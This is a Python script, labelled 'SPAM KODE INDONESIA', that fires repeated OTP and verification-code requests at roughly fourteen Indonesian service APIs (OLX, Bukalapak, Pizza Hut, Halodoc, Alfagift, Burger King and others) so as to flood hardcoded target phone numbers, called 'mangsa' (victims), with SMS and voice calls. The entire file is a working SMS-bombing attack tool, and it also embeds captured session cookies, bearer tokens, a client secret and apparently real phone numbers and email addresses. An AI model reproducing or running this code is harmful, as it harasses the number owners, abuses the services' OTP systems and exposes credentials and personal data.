#SPAM KODE INDONESIA
import requests,time,os,json
from random import choice
from colorama import Fore

global num,spam# Universal use 

USER_AGENTS = ["Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0",
"Mozilla/5.0 (Android 4.4; Tablet; rv:41.0) Gecko/41.0 Firefox/41.0",
"Mozilla/5.0 (Windows NT x.y; rv:10.0) Gecko/20100101 Firefox/10.0",
"Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0",
"Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0"]

TYPES = ["voice", "sms"]

TYPE = choice(TYPES)

USER_AGENT = choice(USER_AGENTS)

#num1 = str(input("Nomer mangsa 1 : +62"))
#num2 = str(input("Nomer mangsa 2 : +62"))

num3 = ["83844624701", "83867498046"]

num = choice(num3)

spam = int(input("Berapa kali mau spam : "))



def olx():
    url = "https://www.olx.co.id/api/auth/authenticate"

    payload = {
        "grantType": "phone",
        "language": "id",
        "phone": "+62"+num
    }
    headers = {
        "cookie": "user=j%253A%257B%257D; _abck=FA54A807D34E5E1707EF60BD374B2746~-1~YAAQveUcuBL1v3SEAQAA%2FlBChgjvGm2itE%2FIPWceUo8cNGpf4YWoif55fwiSTHLoOz3NjoEJOPpw1qbhx9LVMibbv18OJ399Jwqisgqtyjj0x2nWze4pG60ZhopO3PbE0tLDmIox5arGxLbf99LQrMV7ZLH%2BnlFhmTW42XdW2iDHqI94HKG7rdOGxpxqIRC%2Fd7jsG6ShR5kOOP13VFM1PQWWFCLWTh0G2%2FfTo65Sfa7L2woApeLl1RCZBjpQg9u75uH9RdHLofwxZjx7HqqdIXWGF87ZzZjWC5p4lxUDd2g%2BX4WHVl%2BK5Ey%2BTlrXz1AK8gzDR0kvu4Eznt1YRyS6EcueWtUrSvkvboCCl7Iyv7x6%2Fzv%2BskZAL2YdoeQfIFlz%2FheehEa0wktJLg%3D%3D~-1~-1~-1; bm_sz=6D9A072B29AFF965EBB71F3197AF49D2~YAAQveUcuDLwv3SEAQAA5xNChhEl1SQowy0e5%2FTI8j1SzzUsuNYP80SY%2FitaIRa4v04Yydj0NE54Y57q8qOCZjpyo%2BUGm7sSZJoQh%2BFqRXr2f1x8kx0jRFnb84vA2UFRu%2FQT%2BdcgT3AkER7MESZeuj6%2BGeMXd4s1GKM6MUqKahGHfn3zZ%2F2uIcTXNzmfLopDof9LW6rS0Xva5PDQZWJ%2FNermxYYHtbECrv7u7LNEhiWWVyjq3AWWJuNbvMacJIaeUhPwtohkWGdf8XJYSFRPqGQZyFkCREXdPhqLpzQin30O7w%3D%3D~4408115~3684678",
        "sec-ch-ua": '""Microsoft Edge";v="107", "Chromium";v="107", "Not=A?Brand";v="24""',
        "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
        "sec-ch-ua-mobile": "?0",
        "user-agent": USER_AGENT,
        "content-type": "application/json",
        "accept": "*/*",
        "sec-ch-ua-platform": '""Windows""',
        "origin": "https://www.olx.co.id",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.olx.co.id/medan-kota_g4000131/q-toko",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"
    }

    response = requests.request("POST", url, json=payload, headers=headers)
    
    raw_res = json.loads(response.text)

    if (response.status_code != 200):
        print(Fore.RED, "[OLX] STATUS => ",raw_res["errorType"])
    else:
        print(Fore.GREEN, "[OLX] STATUS => ",raw_res["status"])

def BukaLapakAPI():
    url = "https://accounts.bukalapak.com/register"

    payload = {
        "access_token": "tUt_5sE1gBSYya2P_5IWd3kQ-TY8fyMGfyPpWDiMaih9lA",
        "authenticity_token": "QmUcFZBkRjARqT6+N2jJ1h17GB8c11iwcRqUYgoPv51Xo+80VkbmPMoFxwipoI0kazP3DaO1XClAnHaKbysESA==",
        "user": {"phone": "0"+num}
    }
    headers = {
        "cookie": "lskjfewjrh34ghj23brjh234=YkQ3cDhyamJ1RmttWjRqVnlqUThtenhIYys5MG14U1pjMi9qQ1U0cXY4WU40UmlkQ1dqT2RJTEJNcllDNTNxaGt4NytPdk5GTG1nc2ZjZDFXMFlWVjR3SGxhODZ5U054bTJnY1RWL0MzUVBiUWRIY2k1L2lCL0ZUM0pNM2haZFlpZHBmaVhmekZ0bVJUYWtOcTBtLzJTYjc2ZGlKb0IrK0U0Mm5ieFFUc3V1Y1VsTVkwQjArT0ZqcUNGaTl2KzJNLS1OUGhqTURTWTVSSUF5VmU0WEQvWkpBPT0%3D--20d3f3bf32590b9e7a71f718d2668291c219612f",
        "bukalapak-identity": "fb2a579b9c8a219f92002cb19830ab29",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42",
        "content-type": "application/json",
        "bukalapak-otp-method": "SMS",
        "sec-ch-ua-platform": '""Windows""',
        "accept": "*/*",
        "origin": "https://accounts.bukalapak.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://accounts.bukalapak.com/register?comeback=https%3A%2F%2Fwww.bukalapak.com%2F&from=nav_header",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"
    }

    response = requests.request("POST", url, json=payload, headers=headers)

    x = json.loads(response.text)
    try:

        if (response.status_code != 401 ):
            print (Fore.RED, "[BUKALAPAK] STATUS TIME => ",x["meta"]["wait_time"])
        else:
            print (Fore.GREEN, "[BUKALAPAK] STATUS TIME => ",x["meta"]["wait_time"])
    except:
        print (Fore.RED, "[BUKALAPAK] STATUS => ", x["errors"][0]["message"])

        
def KlikIndoMaretAPI():
    url = "https://prd-api.klikindomaret.com/Account/PreRegistration/Verification"

    payload = {
        "HashCode": "",
        "Method": "SMS",
        "MobilePhone": "085776021209",
        "OldMobilePhone": "",
        "TimeStamp": "11/12/2022 11:54:15",
        "type": "regist"
    }
    headers = {
        "content-type": "application/json",
        "pragma": "no-cache",
        "accept": "*/*",
        "authorization": "Bearer B0F056884DEEDA936FB898017C91FEA639AEF047",
        "expires": "0",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-GB,en;q=0.9",
        "x-api-version": "1",
        "cache-control": "no-cache, no-store, must-revalidate",
        "user-agent": "Klik%20Indomaret/1 CFNetwork/1333.0.4 Darwin/21.5.0"
    }

    response = requests.request("POST", url, json=payload, headers=headers)

    print(response.text)

def PizzaHutAPI():

    url = "https://api-prod.pizzahut.co.id/customer/v1/customer/register"

    payload = {
        "email": "Atiya2@gmail.com",
        "first_name": "dasdsa",
        "gender": 0,
        "last_name": "dsadsa",
        "password": "Atiya_123456",
        "phone": num,
        "birthday": "1931-02-02"
    }
    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.pizzahut.co.id",
        "referer": "https://www.pizzahut.co.id/register",
        "sec-ch-ua": ""'Microsoft Edge'";v="'107'", "'Chromium'";v="'107'", "'Not=A?Brand'";v="'24'"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": ""'Windows'"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": USER_AGENT,
        "x-channel": "2",
        "x-client-id": "b39773b0-435b-4f41-80e9-163eef20e0ab",
        "x-device-id": "web",
        "x-device-type": "PC",
        "x-lang": "en",
        "x-platform": "WEBDESKTOP"
    }


    response = requests.request("POST", url, json=payload, headers=headers)

    if ( response.status_code == 200):
        print ("[PIZZAHUT] STATUS => Successfull")
    else:
        print(Fore.RED, "[PIZZAHUT] STATUS => LIMIT REACHED PLEASE TRY AGAIN TOMORROW")

def PopMeal():

    url = "https://api.dahmakan.com/v4/password-less/phone/code/sms"

    payload = {"phone_no": "+62"+num}
    headers = {
        "Host": "api.dahmakan.com",
        "Accept": "*/*",
        "app_version": "106",
        "Brand": "popmeals",
        "Accept-Encoding": "gzip",
        "Accept-Language": "en",
        "Content-Type": "application/json",
        "City": "Kebumen",
        "User-Agent": USER_AGENT,
        "Connection": "keep-alive"
    }

    response = requests.request("POST", url, json=payload, headers=headers)

    x = json.loads(response.text)

    if ( response.status_code != 200 ):
        print (Fore.RED, "[POPMEAL] STATUS => ", x["error"])
    else:
        print (Fore.GREEN, "[POPMEAL] STATUS => ", x["status"])

def BukuWwarung():

    url = "https://api-v2.bukuwarung.com/api/v2/auth/otp/send"

    payload = {
        "action": "LOGIN_OTP",
        "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6",
        "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn",
        "countryCode": "+62",
        "deviceId": "test-1",
        "method": "SMS",
        "phone": num
    }
    headers = {      
        "sec-ch-ua-mobile": "?0",
        "user-agent": USER_AGENT,
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
        "x-app-version-code": "5050",
        "x-app-version-name": "android",
        "buku-origin": "tokoko",
        "origin": "https://web.tokoko.id",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://web.tokoko.id/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"
    }

    response = requests.request("POST", url, json=payload, headers=headers)

    raw_res = json.loads(response.text)


    if (response.status_code != 200):
        print (Fore.RED, "[BUKUWARUNG] STATUS => ",raw_res["status"])
    else:
        print (Fore.GREEN, "[BUKUWARUNG] STATUS : ",raw_res["message"])



def HomeCredit():

    url = "https://accounts.homecredit.co.id/credstore-fe/services/do/register;jsessionid=pH-HCl20mXDYuzAIsjPL5RkTRpbeDifrlHilgWQTJx8UFV6VutgK!2100557442"

    querystring = {"clientId":"KpB3UVsfGaDUvwurVQTrbCsgpa5CUIgW"}

    payload = "phone="+num+"&dateOfBirth=2022-11-08&pin=120393&otpResend=false&appsflyerId=&advertisingId=&browserFingerprint=iwPyAkjxlE698EvZYYyG"
    headers = {
        "cookie": "__cf_bm=rc75dhJNZLXuU7K9x8AMcs9RQCaiXkAjD7dGjNT6qJg-1668713158-0-AfJtoQKuT4wZGeXLhypdBYaEj2utTB9jw%2BT6ba1a8K%2BXcS4FfmnQ75xcLDgMt7Zzxd1lxEyfNwFABpqPCEKVPFFCuV6Kixj38HLqMgJaNBdk; _cfuvid=e3VGwjv9x_afXm3kMIA4WJSlRrMJbu15U0hhDlkVofY-1668713158702-0-604800000",
        "Connection": "keep-alive",
        "sec-ch-ua": '""Microsoft Edge";v="107", "Chromium";v="107", "Not=A?Brand";v="24""',
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42",
        "sec-ch-ua-platform": '""Windows""',
        "Origin": "https://accounts.homecredit.co.id",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://accounts.homecredit.co.id/credstore-fe/services/register?clientId=KpB3UVsfGaDUvwurVQTrbCsgpa5CUIgW",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "_gcl_au=1.1.281697161.1668712912; _ga=GA1.3.827434475.1668712912; _gid=GA1.3.209235123.1668712912; _dc_gtm_UA-158265619-1=1; _hjSessionUser_1701588=eyJpZCI6IjE5OTRiZDBiLTg2MjUtNTY4Ni05MDRkLTBiOTQyNmNmMWI4OSIsImNyZWF0ZWQiOjE2Njg3MTI5MTI0MjUsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1;"
    }

    response = requests.request("POST", url, data=payload, headers=headers, params=querystring)

    x = json.loads(response.text)

    if ( response.status_code == 200):
        print (Fore.GREEN, "[HOMECREDIT] STATUS => ","+62"+x["otpPhone"] )
    elif ( response.status_code == 422):
        print (Fore.RED, "[HOMECREDIT] STATUS => ",x["message"] )
        
def OptikMelawai():

    url = "https://api.optikmelawai.com/api/v2/auth/register/verify/phone/request"

    payload = {"value": "62"+num}
    headers = {
        "sec-ch-ua": """Microsoft Edge";v="107", "Chromium";v="107", "Not=A?Brand";v="24""",
        "accept": "application/json, text/plain, */*",
        "lang": "id",
        "content-type": "application/json;charset=UTF-8",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42",
        "sec-ch-ua-platform": '""Windows""',
        "origin": "https://www.optikmelawai.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.optikmelawai.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"
    }

    response = requests.request("POST", url, json=payload, headers=headers)

    x = json.loads(response.text)

    if ( x["status"] != "false" ):
        print (Fore.GREEN, "[OPTIKMELAWAI] STATUS => ",x["message"])
    else:
        print (Fore.RED, "[OPTIKMELAWAI] STATUS => ", x["message"])


def Magneto():

    url = "https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests"

    payload = {
        "channel": TYPE,
        "phone_number": "+62"+num
    }
    headers = {
        "cookie": "XSRF-TOKEN=631C99DECB7F6332F7DA6E48B4DC8FBABEE281B40304A566C783E5963C8112A32AC9595EBD8961E3C04DDF2E2778F8E34205",
        "accept": "application/json, text/plain, */*",
        "x-xsrf-token": "631C99DECB7F6332F7DA6E48B4DC8FBABEE281B40304A566C783E5963C8112A32AC9595EBD8961E3C04DDF2E2778F8E34205",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42",
        "content-type": "application/json",
        "origin": "https://www.halodoc.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"
    }

    response = requests.request("POST", url, json=payload, headers=headers)

    x = json.loads(response.text)
    
    if ( response.status_code != 200 ):
        print (Fore.RED, "[MAGNETO] STATUS => ",x['message'],"Channel = ",TYPE)
    else:
        print (Fore.GREEN, "[MAGNETO] STATUS => ",x['otp_wait_time'],"Channel = ",TYPE)

def RupaRupaAPI():
    
    url = "https://wapi.ruparupa.com/auth/generate-otp"

    payload = {
        "phone": "0"+num,
        "action": "register",
        "channel": "message",
        "email": "",
        "token": None,
        "customer_id": "0",
        "is_resend": 10,
        "force": 1
    }
    headers = {
        "cookie": "TS01bc8d62=01f917b6d4fd5f433cdd0f32672fac65993ae335cf4a1008d7a91f18dfd551b9f71823e948dfc5d70af825d4a66cf8d110687c9fef; TSb275a1bc027=084ecb935dab20007f62265952e2c5a3efe33b85b457772c842d425eade36b976abe1d978842be9a08fa0c0de0113000269a8ca125860e36d82633d6c8afaf1617e4b14d9a17471158f1e22493e7d0ee250d36009e2377d98c0cd0583de7a58e",
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTUxZjZmZTEtZmMxOS00YTE4LTkwZjYtNzEwM2ZlYzM1NjIzIiwiaWF0IjoxNjY4MjMyNTI3LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.wyVB-d8aI7zeuvNb_C_YgvXkF6EBehXhklnR6SWzUrQ",
        "content-type": "application/json",
        "origin": "https://www.ruparupa.com",
        "referer": "https://www.ruparupa.com/verification?page=otp-choices",
        "sec-ch-ua": ""'Microsoft Edge'";v="'107'", "'Chromium'";v="'107'", "'Not=A?Brand'";v="'24'"",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": USER_AGENT
    }

    response = requests.request("POST", url, json=payload, headers=headers)

    x = json.loads(response.text)
    if (x["message"] == "Permintaan kode OTP sudah mencapai batas, silakan tunggu 1x24 jam"):
        print(Fore.RED, "[RUPARUPA] STATUS => ", x["message"])
    else:
        print(Fore.GREEN, "[RUPARUPA] STATUS => ", x["message"])
        
def Doss():

    url = "https://api.mobile.doss.co.id/api/v1/auth/login/otp/request"

    payload = {"phone": "62"+num}
    headers = {
        "Host": "api.mobile.doss.co.id",
        "Connection": "keep-alive",
        "sec-ch-ua": ""'Microsoft Edge'";v="'107'", "'Chromium'";v="'107'", "'Not=A?Brand'";v="'24'"",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": USER_AGENT,
        "sec-ch-ua-platform": ""'Windows'"",
        "Origin": "https://doss.co.id",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://doss.co.id/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9"
    }

    response = requests.request("POST", url, json=payload, headers=headers)

    print(response.text)

def MotherCare():

    url = "https://www.mothercare.co.id/privilege_activation/ajax/resend"

    payload = "email=utiya%40gmail.com&phone=62"+num
    headers = {
        "cookie": "PHPSESSID=22664b2fea33e5cc0754855cb9badd62; form_key=s2qQJICHl9hYY6rd; private_content_version=0abd72d992d6bd7a03bc883e71663a12; X-Magento-Vary=bc1ca1fbc7aed2e523970df82b9a047709728320",
        "sec-ch-ua": '""Microsoft Edge";v="107", "Chromium";v="107", "Not=A?Brand";v="24""',
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "user-agent": USER_AGENT,
        "sec-ch-ua-platform": ""'Windows'"",
        "origin": "https://www.mothercare.co.id",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.mothercare.co.id/customer/account/create/email/utiya%40gmail.com/phone/6283844624701/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"
    }

    response = requests.request("POST", url, data=payload, headers=headers)

    x = json.loads(response.text)

    if ( x["status"] != "success" ):
        print (Fore.RED, "[MOTHERCARE] STATUS => ",x["status"])
    else:
        print (Fore.GREEN, "[MOTHERCARE] STATUS => ",x["message"])

def AlfaGift():
    url = "https://webcommerce-gw.alfagift.id/v1/otp/request"

    payload = {
        "action": "REGISTER",
        "autoSwitchSendWaSms": True,
        "mobileNumber": "0"+num,
        "pontaNumber": None,
        "type": 1
    }
    headers = {
        "sec-ch-ua": '""Microsoft Edge";v="107", "Chromium";v="107", "Not=A?Brand";v="24""',
        "sec-ch-ua-platform": '""Windows""',
        "fingerprint": "VnhkxXDdqK3ZY4G/HTTEM2UjgREtV7U46HZl0o4KKulVQ5z390rFX6ShKxZuIr7S",
        "devicemodel": "chrome",
        "accept-language": "id",
        "longitude": "0",
        "sec-ch-ua-mobile": "?0",
        "user-agent": USER_AGENT,
        "content-type": "application/json",
        "accept": "application/json",
        "origin": "https://alfagift.id",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://alfagift.id/",
        "accept-encoding": "gzip, deflate, br"
    }

    response = requests.request("POST", url, json=payload, headers=headers)

    x = json.loads(response.text)
    y = x["status"]

    if ( x["status"]["code"]  == '01' ):
        print (Fore.GREEN, "[ALFAGIFT] STATUS => ", x["status"]["message"])
    else:
        print (Fore.RED, "[ALFAGIFT] STATUS => ", y["message"])

def DuniaGames():
    url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"

    payload = {
        "phoneNumber": "+62"+num,
        "userName": "0"+num
    }
    headers = {
        "sec-ch-ua": '""Microsoft Edge";v="107", "Chromium";v="107", "Not=A?Brand";v="24""',
        "accept-language": "id",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42",
        "content-type": "application/json",
        "ciam-type": "FR",
        "accept": "application/json, text/plain, */*",
        "x-device": "76dd040d-c664-465f-b764-50ad6847d3ac",
        "sec-ch-ua-platform": '""Windows""',
        "origin": "https://duniagames.co.id",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://duniagames.co.id/",
        "accept-encoding": "gzip, deflate, br"
    }

    response = requests.request("POST", url, json=payload, headers=headers)


    try:
        
        x = json.loads(response.text)
        if ( response.status_code == 200):
            print (Fore.GREEN, "[DUNIAGAMES] STATUS => ", x["status"]["message"])
        else:
            print (Fore.RED, "[DUNIAGAMES] STATUS => ", x["status"]["message"])
    except:
        print(Fore.RED, "[DUNIAGAMES] STATUS => NETWORK SUSPENDED BY CLOUDFLARE FIREWALL")

def BurgerKing():

    url = "https://bkdelivery.co.id/api/auth/validate-phone"

    payload = {"mobile_number": "+6285173115683"}
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "accept-encoding": "gzip, deflate, br",
        "authorization": "token Ad1257bJkalknd99alLLyzOdMKGPLoUpTjGjvDyjjLP6mIVrw6Kfnvej5LK2w3J2XGGBz",
        "user-agent": "bk_ios/192 CFNetwork/1333.0.4 Darwin/21.5.0",
        "accept-language": "en-GB,en;q=0.9"
    }

    response = requests.request("POST", url, json=payload, headers=headers)

    x = json.loads(response.text)
    if (response.status_code == 200):
        print (Fore.GREEN, "[BURGERKING] STATUS => ",x["status"])
    else:
        print (Fore.RED, "[BURGERKING] STATUS => Too Many Request !")

def countdown(t):
    real = t
    while t > 0:
        CURSOR_UP = '\033[F'
        ERASE_LINE = '\033[K'
        if t == real:
            print(Fore.RED,ERASE_LINE + '[!] COUNTDOWN IN BEFORE NEXT SPAM : {}s'.format(t))
        else:
            print(Fore.RED,CURSOR_UP + ERASE_LINE + '[!] COUNTDOWN IN BEFORE NEXT SPAM : {}s'.format(t))
        time.sleep(1)
        t -= 1

def loading():
    print(Fore.GREEN, "[+] Spam Counted : ",x)
    print(Fore.CYAN, "[\] Please wait a moment for next spam ")
    countdown(4)
    print(Fore.WHITE)
    os.system('cls')

for x in range(spam):
    BurgerKing()
    Doss()
    DuniaGames()
    AlfaGift()
    Magneto()
    OptikMelawai()
    HomeCredit()
    BukaLapakAPI()
    olx()
    MotherCare()
    PizzaHutAPI()
    RupaRupaAPI()
    PopMeal()
    BukuWwarung()
    loading()


